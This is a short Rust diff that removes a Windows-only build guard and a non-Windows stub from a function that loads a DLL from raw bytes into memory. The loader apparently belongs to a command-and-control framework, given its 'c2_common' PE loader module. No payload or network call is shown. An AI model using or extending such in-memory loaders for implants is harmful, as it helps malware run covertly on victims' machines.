@@ -45,7 +45,6 @@ fn register_loaded_dll(hash: u32, base_address: usize) {
 /// # Returns
 /// * `Ok(base_address)` - The base address where the DLL was loaded
 /// * `Err(error_message)` - Error description if loading failed
-#[cfg(windows)]
 pub fn load_dll_from_bytes(dll_bytes: &[u8]) -> Result<usize, String> {
     use c2_common::pe::loader::PeLoader;
 
@@ -83,10 +82,4 @@ pub fn load_dll_from_bytes(dll_bytes: &[u8]) -> Result<usize, String> {
     std::mem::forget(loader);
 
     Ok(base_addr)
-}
-
-/// Stub for non-Windows platforms
-#[cfg(not(windows))]
-pub fn load_dll_from_bytes(_dll_bytes: &[u8]) -> Result<usize, String> {
-    Err("DLL loading is only supported on Windows".to_string())
 }
